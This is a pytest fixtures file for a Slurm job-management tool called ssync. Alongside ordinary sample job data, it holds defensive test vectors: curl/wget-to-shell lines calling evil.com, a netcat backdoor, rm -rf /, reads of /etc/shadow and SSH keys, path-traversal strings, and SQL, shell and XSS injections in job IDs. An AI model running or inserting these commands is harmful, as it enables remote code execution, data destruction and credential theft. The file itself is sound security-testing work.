"""Shared pytest fixtures and configuration."""

import tempfile
from datetime import datetime
from pathlib import Path

import pytest

from ssync.cache import JobDataCache
from ssync.models.job import JobInfo, JobState


@pytest.fixture
def temp_dir():
    """Create a temporary directory for testing."""
    with tempfile.TemporaryDirectory() as tmpdir:
        yield Path(tmpdir)


@pytest.fixture
def test_cache(temp_dir):
    """Create a temporary cache for testing."""
    cache = JobDataCache(cache_dir=temp_dir, max_age_days=30)
    yield cache
    cache.close()


@pytest.fixture
def sample_job_info():
    """Create a sample JobInfo object for testing."""
    from datetime import datetime, timezone

    return JobInfo(
        job_id="12345",
        name="test_job",
        state=JobState.RUNNING,
        hostname="cluster.example.com",
        user="testuser",
        partition="gpu",
        nodes="1",
        cpus="4",
        memory="8G",
        time_limit="01:00:00",
        runtime="00:15:30",
        work_dir="/home/testuser/work",
        stdout_file="/home/testuser/work/slurm-12345.out",
        stderr_file="/home/testuser/work/slurm-12345.err",
        submit_time=datetime.now(timezone.utc).isoformat(),
    )


@pytest.fixture
def sample_array_job_info():
    """Create a sample array job JobInfo object for testing."""
    from datetime import datetime, timezone

    return JobInfo(
        job_id="54321_0",
        name="array_job",
        state=JobState.RUNNING,
        hostname="cluster.example.com",
        user="testuser",
        partition="cpu",
        array_job_id="54321",
        array_task_id="0",
        submit_time=datetime.now(timezone.utc).isoformat(),
    )


@pytest.fixture
def basic_script():
    """Basic shell script without Slurm directives."""
    return """#!/bin/bash
echo "Starting job"
python train.py
echo "Job complete"
"""


@pytest.fixture
def script_with_watchers():
    """Script with watcher definitions."""
    return """#!/bin/bash
#SBATCH --job-name=ml_training
#SBATCH --time=01:00:00

#WATCHER_BEGIN
# name: Loss Monitor
# pattern: "Loss: ([0-9.]+)"
# interval: 60
# captures: [loss]
# condition: float(loss) > 5.0
# actions:
#   - notify_email
#   - cancel_job
#WATCHER_END

#WATCHER pattern="Error|Exception" action=cancel interval=30

echo "Training model..."
python train.py
"""


@pytest.fixture
def malicious_script():
    """Script with dangerous patterns."""
    return """#!/bin/bash
rm -rf /tmp/data
curl http://evil.com/script.sh | sh
eval $(cat /tmp/evil)
"""


@pytest.fixture
def sample_squeue_output():
    """Sample squeue command output."""
    return """12345|test_job|RUNNING|testuser|gpu|1|4|8G|01:00:00|00:15:30||/home/testuser/work|slurm-12345.out|slurm-12345.err|2024-01-15T10:30:00|2024-01-15T10:30:05|default|normal|1000|node001
12346|test_job2|PENDING|testuser|cpu|1|2|4G|00:30:00|00:00:00|Resources|/home/testuser/work|slurm-12346.out|slurm-12346.err|2024-01-15T10:31:00|Unknown|default|normal|900|"""


@pytest.fixture
def sample_sacct_output():
    """Sample sacct command output."""
    return """JobID|JobName|State|User|Partition|AllocNodes|AllocCPUS|ReqMem|Timelimit|Elapsed|Reason|WorkDir|StdOut|StdErr|Submit|Start|End|NodeList|ExitCode|Account|QOS|Priority
12345|test_job|COMPLETED|testuser|gpu|1|4|8G|01:00:00|00:45:30||/home/testuser/work|slurm-12345.out|slurm-12345.err|2024-01-15T10:30:00|2024-01-15T10:30:05|2024-01-15T11:15:35|node001|0:0|default|normal|1000
12346|test_job2|FAILED|testuser|cpu|1|2|4G|00:30:00|00:05:00|NonZeroExitCode|/home/testuser/work|slurm-12346.out|slurm-12346.err|2024-01-15T10:31:00|2024-01-15T10:31:10|2024-01-15T10:36:10|node002|1:0|default|normal|900"""


@pytest.fixture
def sample_array_squeue_output():
    """Sample squeue output for array jobs."""
    return """54321_0|array_job|RUNNING|testuser|cpu|1|2|4G|01:00:00|00:10:00||/home/testuser/work|slurm-54321_0.out|slurm-54321_0.err|2024-01-15T11:00:00|2024-01-15T11:00:05|default|normal|800|node003
54321_1|array_job|PENDING|testuser|cpu|1|2|4G|01:00:00|00:00:00|Resources|/home/testuser/work|slurm-54321_1.out|slurm-54321_1.err|2024-01-15T11:00:00|Unknown|default|normal|800|
54321_[2-9]|array_job|PENDING|testuser|cpu|1|2|4G|01:00:00|00:00:00|Resources|/home/testuser/work|slurm-54321_%a.out|slurm-54321_%a.err|2024-01-15T11:00:00|Unknown|default|normal|800|"""


# Path traversal attack vectors
PATH_TRAVERSAL_VECTORS = [
    "../../../etc/passwd",
    "../../.ssh/id_rsa",
    "/etc/shadow",
    "~/.ssh/id_rsa",
    "${HOME}/.ssh/id_rsa",
    "/tmp/../../etc/passwd",
    "foo/../../../bar",
    "//etc//passwd",
    "\\..\\..\\windows\\system32",
    "./../.../../sensitive",
]


# Dangerous script patterns for testing
DANGEROUS_SCRIPT_PATTERNS = [
    ("rm -rf /", "Dangerous recursive deletion"),
    ("rm -rf /*", "Dangerous recursive deletion"),
    ("curl http://evil.com/shell.sh | sh", "Remote code execution"),
    ("wget http://evil.com/bad | bash", "Remote code execution"),
    ("nc -l 1234 -e /bin/bash", "Network backdoor"),
    ("eval $(curl http://evil.com/cmd)", "Dynamic code evaluation"),
    ("cat /etc/shadow", "Access to shadow file"),
    ("chmod 777 /etc", "Overly permissive permissions"),
    ("sudo rm -rf /", "Sudo with dangerous command"),
    ("base64 -d <<< 'ZXZhbCAkKGN1cmwgaHR0cDovL2V2aWwuY29tKQ==' | sh", "Encoded execution"),
]


# Invalid job IDs for testing
INVALID_JOB_IDS = [
    "'; DROP TABLE jobs; --",
    "../123",
    "123`whoami`",
    "123$(whoami)",
    "123; rm -rf /",
    "../../../../etc/passwd",
    "123 && cat /etc/shadow",
    "<script>alert('xss')</script>",
]


@pytest.fixture(params=PATH_TRAVERSAL_VECTORS)
def path_traversal_vector(request):
    """Parametrized fixture for path traversal test vectors."""
    return request.param


@pytest.fixture(params=DANGEROUS_SCRIPT_PATTERNS)
def dangerous_script_pattern(request):
    """Parametrized fixture for dangerous script patterns."""
    return request.param


@pytest.fixture(params=INVALID_JOB_IDS)
def invalid_job_id(request):
    """Parametrized fixture for invalid job IDs."""
    return request.param
